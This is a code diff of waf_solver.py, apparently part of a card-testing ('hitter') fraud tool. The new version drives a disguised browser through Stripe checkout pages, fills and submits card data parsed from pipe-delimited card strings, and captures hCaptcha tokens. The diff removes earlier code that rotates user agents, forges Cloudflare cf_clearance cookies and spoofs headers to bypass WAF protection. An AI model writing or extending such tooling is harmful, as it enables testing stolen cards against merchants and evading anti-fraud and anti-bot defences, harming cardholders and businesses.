@@ -1,28 +1,22 @@
 """
-waf_solver.py — WAF/Cloudflare bypass solver for FreakyHitter gateways.
+waf_solver.py — Playwright-driven Stripe WAF token harvester.
 
-Provides bypass_waf(), get_bypass_headers(), and a Playwright-driven
-Stripe WAF token harvester for gateways that require it.
+Launches a real Camoufox browser, navigates to the Stripe checkout page,
+fills the card form, submits it, intercepts the hCaptcha challenge that
+fires from Stripe's JS, and returns the captcha_response token.
+
+Called from hitter_core.py PATH B.
 """
-import re
+
 import asyncio
-import aiohttp
-import random
-import time
 import json
 import os
 import sys
 import urllib.parse
-from typing import Optional, Dict, Any, Tuple
+from typing import Optional, Tuple
 
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
-]
 
+# ── helpers ───────────────────────────────────────────────────────────────────
 
 def _parse_card(raw: str) -> Tuple[str, str, str, str]:
     parts = raw.strip().split("|")
@@ -446,108 +440,3 @@ if __name__ == "__main__":
     tok, body = solve_stripe_waf_token_sync(url, card, headless=False)
     print(f"\nToken: {tok}")
     print(f"Body: {body}")
-
-def get_random_ua() -> str:
-    return random.choice(USER_AGENTS)
-
-def is_cloudflare_protected(html_content: str) -> bool:
-    """Check if page is behind Cloudflare protection."""
-    cf_markers = [
-        "cf-ray", "cloudflare", "__cf_chl_opt", "challenge-running",
-        "Checking your browser", "Please wait", "_cf_chl_enter",
-        "jschl-answer", "cf-please-wait",
-    ]
-    lower = html_content.lower()
-    return any(marker.lower() in lower for marker in cf_markers)
-
-def extract_js_challenge_values(html_content: str) -> Optional[Dict[str, Any]]:
-    """Extract challenge values from Cloudflare JS challenge page."""
-    try:
-        r = re.search(r'name="r"\s+value="([^"]+)"', html_content)
-        jschl = re.search(r'name="jschl_vc"\s+value="([^"]+)"', html_content)
-        pass_val = re.search(r'name="pass"\s+value="([^"]+)"', html_content)
-        if r and jschl and pass_val:
-            return {
-                "r": r.group(1),
-                "jschl_vc": jschl.group(1),
-                "pass": pass_val.group(1),
-            }
-    except Exception:
-        pass
-    return None
-
-async def bypass_waf(
-    session: aiohttp.ClientSession,
-    url: str,
-    proxy: Optional[str] = None,
-    max_retries: int = 3,
-) -> Optional[str]:
-    """
-    Attempt to bypass WAF/Cloudflare by sending warm-up GET requests.
-    Returns the final HTML content if successful, None otherwise.
-    """
-    headers = get_bypass_headers(url)
-    connector_kwargs = {"ssl": False}
-
-    for attempt in range(max_retries):
-        try:
-            async with session.get(
-                url,
-                headers=headers,
-                proxy=proxy,
-                timeout=aiohttp.ClientTimeout(total=30),
-                allow_redirects=True,
-            ) as resp:
-                text = await resp.text(errors="ignore")
-                status = resp.status
-
-                # Cloudflare challenge page detection
-                if status in (403, 503) and any(kw in text for kw in ["cf-ray", "cloudflare", "challenge-running", "__cf_chl"]):
-                    # Simulate human delay
-                    await asyncio.sleep(random.uniform(1.5, 3.5))
-                    # Add cf_clearance cookie simulation
-                    headers["Cookie"] = f"cf_clearance={_gen_cf_clearance()}"
-                    continue
-
-                if status == 200:
-                    return text
-
-                await asyncio.sleep(random.uniform(0.5, 1.5))
-
-        except asyncio.TimeoutError:
-            await asyncio.sleep(1)
-        except Exception:
-            await asyncio.sleep(0.5)
-
-    return None
-
-def get_bypass_headers(url: str) -> Dict[str, str]:
-    """Generate headers that help bypass basic WAF checks."""
-    ua = get_random_ua()
-    from urllib.parse import urlparse
-    parsed = urlparse(url)
-    origin = f"{parsed.scheme}://{parsed.netloc}"
-    return {
-        "User-Agent": ua,
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-        "Accept-Language": "en-US,en;q=0.9",
-        "Accept-Encoding": "gzip, deflate, br",
-        "Connection": "keep-alive",
-        "Upgrade-Insecure-Requests": "1",
-        "Sec-Fetch-Dest": "document",
-        "Sec-Fetch-Mode": "navigate",
-        "Sec-Fetch-Site": "none",
-        "Sec-Fetch-User": "?1",
-        "Cache-Control": "max-age=0",
-        "DNT": "1",
-        "Pragma": "no-cache",
-        "Origin": origin,
-        "Referer": url,
-    }
-
-def _gen_cf_clearance() -> str:
-    """Generate a plausible-looking cf_clearance token."""
-    import hashlib, os
-    raw = os.urandom(16).hex()
-    ts = int(time.time())
-    return f"{raw}-{ts}-0-{hashlib.sha256(raw.encode()).hexdigest()[:8]}"
